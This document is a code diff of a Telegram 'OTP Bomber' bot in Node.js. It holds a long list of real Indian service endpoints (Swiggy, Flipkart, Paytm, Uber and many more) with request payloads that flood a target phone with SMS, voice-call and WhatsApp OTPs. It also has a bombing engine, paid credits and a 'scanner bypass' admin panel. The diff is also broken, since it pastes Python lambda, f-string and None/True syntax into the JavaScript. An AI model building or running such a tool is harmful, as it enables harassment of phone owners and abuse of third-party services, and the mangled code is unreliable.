@@ -1,4 +1,4 @@
-// bot.js – Complete Fixed Version
+// bot.js – Complete Node.js OTP Bomber with ALL Python features
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const { BOT_TOKEN, ADMIN_IDS } = require('./config');
@@ -12,8 +12,9 @@ const bombingStatus = new Map();
 // ---------- USER STATES ----------
 const userStates = new Map();
 const pendingPayments = new Map();
+const adminStates = new Map();
 
-// ---------- FULL API CONFIGURATION ----------
+// ================= COMPLETE APIS (MERGED) =================
 const API_CONFIGS = [
     {
       "name": "Hotstar_1",
@@ -458,7 +459,7 @@ const API_CONFIGS = [
         "cookie": "_gcl_dc=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gcl_aw=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; moe_uuid=6a221a22-79b0-4a05-87a6-bb6ccc786f4e; WZRK_S_8WR-895-K74Z=%7B%22p%22%3A1%2C%22s%22%3A1600794521%2C%22t%22%3A1600794520%7D; km_lv=1600794517; kvcd=1600794517298; _gac_UA-52838179-3=1.1600792907.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gid=GA1.2.1580594851.1600792840; _ga=GA1.2.999929697.1600792840; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%226a221a22-79b0-4a05-87a6-bb6ccc786f4e%22%2C%22deviceAdded%22%3Atrue%7D; _fbp=fb.1.1600792808706.1882458684; _gcl_au=1.1.1765065041.1600792806; WZRK_G=9d0490f3acc94a80a8feafc7aaa146b0; km_vs=1; km_ai=qEioHmXYYtngAVbnv7c6PZcDSIM%3D"
       },
       "data": {
-        "email": null,
+        "email": None,
         "phoneCode": "+91",
         "phoneNumber": "{phone}",
         "ver": "11.345"
@@ -491,8 +492,8 @@ const API_CONFIGS = [
         "country_code": "IN",
         "otp_type": 1,
         "email": "",
-        "send_otp": true,
-        "is_un_teach_user": false
+        "send_otp": True,
+        "is_un_teach_user": False
       },
       "phone_format": "raw"
     },
@@ -732,7 +733,7 @@ const API_CONFIGS = [
         "state": "",
         "responseType": "code",
         "theme": "mp-html5",
-        "dob_agreement": true
+        "dob_agreement": True
       },
       "phone_format": "raw"
     },
@@ -1506,7 +1507,7 @@ const API_CONFIGS = [
         "dialingCode": "+91",
         "countryCode": "IN",
         "headers": {},
-        "verificationId": null,
+        "verificationId": None,
         "captchaInfo": {
           "gcaptcha": "03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA",
           "fingerPrint": 3664542227,
@@ -1887,7 +1888,7 @@ const API_CONFIGS = [
       "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" }),
+      "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}',
       "phone_format": "raw"
     },
     {
@@ -1895,7 +1896,7 @@ const API_CONFIGS = [
       "url": "https://www.1mg.com/auth_api/v6/create_token",
       "method": "POST",
       "headers": {"Content-Type": "application/json; charset=utf-8"},
-      "data": (phone) => JSON.stringify({ number: phone, otp_on_call: true }),
+      "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}',
       "phone_format": "raw"
     },
     {
@@ -1903,7 +1904,7 @@ const API_CONFIGS = [
       "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone }),
+      "data": lambda phone: f'{{"mobile":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -1911,7 +1912,7 @@ const API_CONFIGS = [
       "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone }),
+      "data": lambda phone: f'{{"mobile":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -1919,7 +1920,7 @@ const API_CONFIGS = [
       "url": "https://www.amazon.in/ap/signin",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `phone=${phone}&action=voice_otp`,
+      "data": lambda phone: f"phone={phone}&action=voice_otp",
       "phone_format": "raw"
     },
     {
@@ -1927,7 +1928,7 @@ const API_CONFIGS = [
       "url": "https://accounts.paytm.com/signin/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
+      "data": lambda phone: f'{{"phone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -1935,7 +1936,7 @@ const API_CONFIGS = [
       "url": "https://www.zomato.com/php/o2_api_handler.php",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `phone=${phone}&type=voice`,
+      "data": lambda phone: f"phone={phone}&type=voice",
       "phone_format": "raw"
     },
     {
@@ -1943,7 +1944,7 @@ const API_CONFIGS = [
       "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
+      "data": lambda phone: f'{{"phone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -1951,7 +1952,7 @@ const API_CONFIGS = [
       "url": "https://api.olacabs.com/v1/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
+      "data": lambda phone: f'{{"phone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -1959,15 +1960,15 @@ const API_CONFIGS = [
       "url": "https://auth.uber.com/v2/voice-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: `+91${phone}` }),
+      "data": lambda phone: f'{{"phone":"+91{phone}"}}',
       "phone_format": "raw"
     },
     {
       "name": "KPN WhatsApp",
       "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
       "method": "POST",
-      "headers": { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
-      "data": (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }),
+      "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"},
+      "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
       "phone_format": "raw"
     },
     {
@@ -1975,15 +1976,15 @@ const API_CONFIGS = [
       "url": "https://www.foxy.in/api/v2/users/send_otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "whatsapp" }),
+      "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
       "phone_format": "raw"
     },
     {
       "name": "Jockey WhatsApp",
-      "url": (phone) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+91${phone}?whatsapp=true`,
+      "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
       "method": "GET",
       "headers": {},
-      "data": null,
+      "data": None,
       "phone_format": "raw"
     },
     {
@@ -1991,7 +1992,7 @@ const API_CONFIGS = [
       "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
       "method": "POST",
       "headers": {"Content-Type": "application/json; charset=utf-8"},
-      "data": (phone) => JSON.stringify({ country_code: "+91", phone: phone }),
+      "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -1999,7 +2000,7 @@ const API_CONFIGS = [
       "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phoneCode: "+91", telephone: phone }),
+      "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -2007,7 +2008,7 @@ const API_CONFIGS = [
       "url": "https://www.nobroker.in/api/v3/account/otp/send",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `phone=${phone}&countryCode=IN`,
+      "data": lambda phone: f"phone={phone}&countryCode=IN",
       "phone_format": "raw"
     },
     {
@@ -2015,7 +2016,7 @@ const API_CONFIGS = [
       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
+      "data": lambda phone: f'{{"phone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -2023,7 +2024,7 @@ const API_CONFIGS = [
       "url": "https://api.wakefit.co/api/consumer-sms-otp/",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone }),
+      "data": lambda phone: f'{{"mobile":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -2031,7 +2032,7 @@ const API_CONFIGS = [
       "url": "https://communication.api.hungama.com/v1/communication/otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", device: "web" }),
+      "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
       "phone_format": "raw"
     },
     {
@@ -2039,7 +2040,7 @@ const API_CONFIGS = [
       "url": "https://merucabapp.com/api/otp/generate",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `mobile_number=${phone}`,
+      "data": lambda phone: f"mobile_number={phone}",
       "phone_format": "raw"
     },
     {
@@ -2047,7 +2048,7 @@ const API_CONFIGS = [
       "url": "https://api.snapmint.com/v1/public/sign_up",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone }),
+      "data": lambda phone: f'{{"phone":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -2055,7 +2056,7 @@ const API_CONFIGS = [
       "url": "https://login.housing.com/api/v2/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, country_url_name: "in" }),
+      "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
       "phone_format": "raw"
     },
     {
@@ -2063,7 +2064,7 @@ const API_CONFIGS = [
       "url": "https://api.khatabook.com/v1/auth/request-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, app_signature: "wk+avHrHZf2" }),
+      "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
       "phone_format": "raw"
     },
     {
@@ -2071,7 +2072,7 @@ const API_CONFIGS = [
       "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone }),
+      "data": lambda phone: f'{{"mobile":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -2079,7 +2080,7 @@ const API_CONFIGS = [
       "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-      "data": (phone) => `source=sms&app_version=3.0.9&mobile_number=${phone}&platform=ANDROID&domain=nykaa`,
+      "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa",
       "phone_format": "raw"
     },
     {
@@ -2087,7 +2088,7 @@ const API_CONFIGS = [
       "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, isPlaycircle: false }),
+      "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}',
       "phone_format": "raw"
     },
     {
@@ -2095,7 +2096,7 @@ const API_CONFIGS = [
       "url": "https://animall.in/zap/auth/login",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" }),
+      "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
       "phone_format": "raw"
     },
     {
@@ -2103,7 +2104,7 @@ const API_CONFIGS = [
       "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, version: "1.4.28" }),
+      "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}',
       "phone_format": "raw"
     },
     {
@@ -2111,7 +2112,7 @@ const API_CONFIGS = [
       "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, locale: "IN" }),
+      "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}',
       "phone_format": "raw"
     },
     {
@@ -2119,7 +2120,7 @@ const API_CONFIGS = [
       "url": "https://customer.rapido.bike/api/otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone }),
+      "data": lambda phone: f'{{"mobile":"{phone}"}}',
       "phone_format": "raw"
     },
     {
@@ -2127,7 +2128,7 @@ const API_CONFIGS = [
       "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user" }),
+      "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}',
       "phone_format": "raw"
     },
     {
@@ -2135,7 +2136,7 @@ const API_CONFIGS = [
       "url": "https://www.dream11.com/auth/passwordless/init",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone, templateName: "default" }),
+      "data": lambda phone: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{phone}","templateName":"default"}}',
       "phone_format": "raw"
     },
     {
@@ -2143,7 +2144,7 @@ const API_CONFIGS = [
       "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4, expected_action: "login" }),
+      "data": lambda phone: f'{{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}',
       "phone_format": "raw"
     },
     {
@@ -2151,7 +2152,7 @@ const API_CONFIGS = [
       "url": "https://www.licious.in/api/login/signup",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ phone: phone, captcha_token: null }),
+      "data": lambda phone: f'{{"phone":"{phone}","captcha_token":null}}',
       "phone_format": "raw"
     },
     {
@@ -2159,7 +2160,7 @@ const API_CONFIGS = [
       "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
       "method": "POST",
       "headers": {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"},
-      "data": (phone) => `mobile=${phone}`,
+      "data": lambda phone: f"mobile={phone}",
       "phone_format": "raw"
     },
     {
@@ -2167,21 +2168,48 @@ const API_CONFIGS = [
       "url": "https://api.charzer.com/auth-service/send-otp",
       "method": "POST",
       "headers": {"Content-Type": "application/json"},
-      "data": (phone) => JSON.stringify({ mobile: phone, appSource: "CHARZER_APP" }),
+      "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}',
       "phone_format": "raw"
     }
 ];
-
 // ---------- FALLBACK DATA GENERATOR ----------
 function makeFallbackData(phone, apiName) {
     const lower = apiName.toLowerCase();
     if (lower.includes('voice') || lower.includes('call')) {
-        return JSON.stringify({ mobile: phone, channel: 'voice' });
-    } else if (lower.includes('whatsapp')) {
-        return JSON.stringify({ mobile: phone, channel: 'whatsapp' });
-    } else {
-        return JSON.stringify({ mobile: phone });
+        if (lower.includes('tata')) {
+            return JSON.stringify({ phone, isOtpViaCallAtLogin: "true" });
+        } else if (lower.includes('1mg')) {
+            return JSON.stringify({ number: phone, otp_on_call: true });
+        } else if (lower.includes('swiggy')) {
+            return JSON.stringify({ mobile: phone });
+        } else if (lower.includes('flipkart')) {
+            return `phone=${phone}&action=voice_otp`;
+        } else if (lower.includes('amazon')) {
+            return `phone=${phone}&action=voice_otp`;
+        } else if (lower.includes('paytm')) {
+            return JSON.stringify({ phone });
+        } else if (lower.includes('uber')) {
+            return JSON.stringify({ phone: `+91${phone}` });
+        } else {
+            return JSON.stringify({ mobile: phone });
+        }
     }
+    if (lower.includes('whatsapp')) {
+        if (lower.includes('kpn')) {
+            return JSON.stringify({
+                notification_channel: "WHATSAPP",
+                phone_number: { country_code: "+91", number: phone }
+            });
+        } else if (lower.includes('foxy')) {
+            return JSON.stringify({
+                user: { phone_number: `+91${phone}` },
+                via: "whatsapp"
+            });
+        } else {
+            return JSON.stringify({ mobile: phone, channel: "whatsapp" });
+        }
+    }
+    return JSON.stringify({ mobile: phone });
 }
 
 // ---------- BOMBING ENGINE ----------
@@ -2192,11 +2220,44 @@ async function makeApiCall(api, phone) {
         else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);
 
         const headers = { ...api.headers };
+        
+        // Remove problematic headers (axios auto-handles)
+        delete headers['content-length'];
+        delete headers['Content-Length'];
+        delete headers['host'];
+        delete headers['Host'];
+
         let data = null;
+        let isRaw = false;
+
         if (api.data) {
-            if (typeof api.data === 'function') data = api.data(phone);
-            else if (typeof api.data === 'object') data = JSON.parse(JSON.stringify(api.data));
-            else data = api.data;
+            if (typeof api.data === 'function') {
+                data = api.data(phone);
+            } else if (api.data._raw) {
+                // Python style raw data (x-www-form-urlencoded)
+                let rawData = api.data._raw;
+                if (typeof rawData === 'string') {
+                    rawData = rawData.replace(/{phone}/g, phone);
+                }
+                data = rawData;
+                isRaw = true;
+            } else {
+                data = JSON.parse(JSON.stringify(api.data));
+                // Deep replace {phone}
+                const replacePhone = (obj) => {
+                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
+                    if (Array.isArray(obj)) return obj.map(replacePhone);
+                    if (typeof obj === 'object' && obj !== null) {
+                        const newObj = {};
+                        for (let key in obj) {
+                            newObj[key] = replacePhone(obj[key]);
+                        }
+                        return newObj;
+                    }
+                    return obj;
+                };
+                data = replacePhone(data);
+            }
         } else {
             data = makeFallbackData(phone, api.name);
         }
@@ -2207,11 +2268,23 @@ async function makeApiCall(api, phone) {
             url,
             headers,
             timeout: 2000,
+            transformRequest: [(d) => d],
         };
+
         if (method === 'post' || method === 'put') {
-            if (typeof data === 'string') config.data = data;
-            else config.data = JSON.stringify(data);
+            if (isRaw || typeof data === 'string') {
+                config.data = data;
+                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
+                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                }
+            } else {
+                config.data = JSON.stringify(data);
+                if (!headers['Content-Type']) {
+                    headers['Content-Type'] = 'application/json';
+                }
+            }
         }
+
         const response = await axios(config);
         return response.status;
     } catch (err) {
@@ -2220,6 +2293,7 @@ async function makeApiCall(api, phone) {
 }
 
 async function runBomber(chatId, phone, durationMinutes) {
+    // Check protected numbers
     const protectedList = await db.getProtected();
     if (protectedList.includes(phone)) {
         bot.sendMessage(chatId, '⚠️ This number is PROTECTED by admin.\nBombing not allowed!');
@@ -2363,10 +2437,13 @@ function getDurationText(minutes) {
 
 // ---------- KEYBOARDS ----------
 function mainKeyboard() {
+    const day = new Date().getDate();
+    const colors = ['🟢','🔵','🟡','🔴','🟣','🟠','🟤','⚫','⚪','🟢'];
+    const color = colors[day % colors.length];
     return {
         reply_markup: {
             keyboard: [
-                ['🟢 START BOMB', '🔴 STOP BOMB'],
+                [`${color} START BOMB`, '🔴 STOP BOMB'],
                 ['💰 MY CREDITS', '🎁 DAILY SPIN'],
                 ['🎟️ REDEEM CODE', '👑 ADMIN PANEL'],
                 ['📊 MY STATS', '❓ HELP'],
@@ -2396,16 +2473,14 @@ function adminKeyboard() {
     };
 }
 
-// ---------- CREATE CHANNEL BUTTONS ----------
+// ---------- CHANNEL BUTTONS ----------
 async function getChannelButtons() {
     const channels = await db.getChannels();
     const buttons = channels.map(ch => {
-        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}`, callback_data: `verify_channel_${ch}` }];
+        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}` }];
     });
     buttons.push([{ text: '🟢 I have joined all channels', callback_data: 'verify_join' }]);
-    return {
-        inline_keyboard: buttons
-    };
+    return { inline_keyboard: buttons };
 }
 
 // ---------- COMMAND HANDLERS ----------
@@ -2442,7 +2517,6 @@ bot.onText(/\/start/, async (msg) => {
                 { parse_mode: 'Markdown', reply_markup: keyboard }
             );
         } else {
-            // No channels configured, proceed directly
             await showMainMenu(chatId);
         }
         return;
@@ -2510,38 +2584,129 @@ bot.on('callback_query', async (callbackQuery) => {
         pendingPayments.set(chatId, { credits, amount, description, payId });
         bot.sendMessage(chatId, `💳 **Payment for ${description}**\n\nPlease send ₹${amount} to UPI: \`example@upi\`\n\nAfter payment, use: \`/verify ${payId}\``, { parse_mode: 'Markdown' });
         bot.answerCallbackQuery(callbackQuery.id);
+        return;
     }
 
-    // Admin channel management
-    if (data === 'admin_add_channel') {
+    // Broadcast type selection
+    if (data === 'broadcast_text') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        adminStates.set(chatId, { action: 'broadcast_text' });
+        bot.editMessageText('📝 Send the text message to broadcast:', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'broadcast_photo') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        adminStates.set(chatId, { action: 'broadcast_photo' });
+        bot.editMessageText('🖼️ Send the photo with caption (optional):', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'broadcast_video') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        adminStates.set(chatId, { action: 'broadcast_video' });
+        bot.editMessageText('🎥 Send the video with caption (optional):', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'broadcast_document') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        adminStates.set(chatId, { action: 'broadcast_document' });
+        bot.editMessageText('📄 Send the document with caption (optional):', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'broadcast_audio') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        adminStates.set(chatId, { action: 'broadcast_audio' });
+        bot.editMessageText('🔊 Send the audio with caption (optional):', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'broadcast_sticker') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        adminStates.set(chatId, { action: 'broadcast_sticker' });
+        bot.editMessageText('🏷️ Send the sticker:', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // Channel manager callbacks
+    if (data === 'channel_add') {
         if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
         userStates.set(chatId, { state: 'add_channel' });
-        bot.editMessageText('✏️ Send channel username (e.g., @mychannel)', { chat_id: chatId, message_id: msgId });
+        bot.editMessageText('📺 Send channel username to add (e.g., @channelname):', { chat_id: chatId, message_id: msgId });
         bot.answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'admin_remove_channel') {
+        return;
+    }
+    if (data === 'channel_remove') {
         if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
-        userStates.set(chatId, { state: 'remove_channel' });
         const channels = await db.getChannels();
         if (channels.length === 0) {
-            bot.editMessageText('❌ No channels to remove.', { chat_id: chatId, message_id: msgId });
+            bot.editMessageText('📭 No channels to remove.', { chat_id: chatId, message_id: msgId });
             return bot.answerCallbackQuery(callbackQuery.id);
         }
-        let msg = '✏️ Send channel username to remove:\n\n';
-        channels.forEach((ch, i) => {
-            msg += `${i+1}. ${ch}\n`;
-        });
+        userStates.set(chatId, { state: 'remove_channel' });
+        let msg = '📺 **Current Channels:**\n' + channels.join('\n') + '\n\nSend channel username to remove:';
         bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
         bot.answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'admin_list_channels') {
+        return;
+    }
+    if (data === 'channel_view') {
         if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
         const channels = await db.getChannels();
-        const msg = channels.length ? `📺 **Current Channels**\n${channels.join('\n')}` : '❌ No channels configured.';
-        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
+        const msg = channels.length ? `📺 **Required Channels:**\n${channels.join('\n')}` : '📭 No channels configured.';
+        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
         bot.answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'admin_back') {
+        return;
+    }
+
+    // Scanner manager callbacks
+    if (data === 'scanner_add') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        userStates.set(chatId, { state: 'add_scanner' });
+        bot.editMessageText('🛡️ Send scanner bypass data (JSON format or description):', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'scanner_remove') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        const config = await db.getScannerConfig();
+        if (config.scanners.length === 0) {
+            bot.editMessageText('📭 No scanners configured.', { chat_id: chatId, message_id: msgId });
+            return bot.answerCallbackQuery(callbackQuery.id);
+        }
+        let msg = '🛡️ **Current Scanners:**\n';
+        config.scanners.forEach((s, i) => msg += `${i+1}. ${s.substring(0, 50)}...\n`);
+        msg += '\nSend scanner number to remove:';
+        userStates.set(chatId, { state: 'remove_scanner' });
+        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'scanner_view') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        const config = await db.getScannerConfig();
+        const msg = config.scanners.length ? `🛡️ **Configured Scanners:**\n\n${config.scanners.map((s, i) => `${i+1}. ${s}`).join('\n')}` : '📭 No scanners configured.';
+        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+    if (data === 'scanner_headers') {
+        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
+        userStates.set(chatId, { state: 'set_global_headers' });
+        bot.editMessageText('🔄 Send global headers in JSON format:\n`{"header1": "value1", "header2": "value2"}`', 
+            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // Admin back
+    if (data === 'admin_back') {
         bot.editMessageText('🔐 Admin Panel', { chat_id: chatId, message_id: msgId });
         bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
         bot.answerCallbackQuery(callbackQuery.id);
+        return;
     }
 });
 
@@ -2550,22 +2715,17 @@ bot.onText(/\/bomb/, async (msg) => {
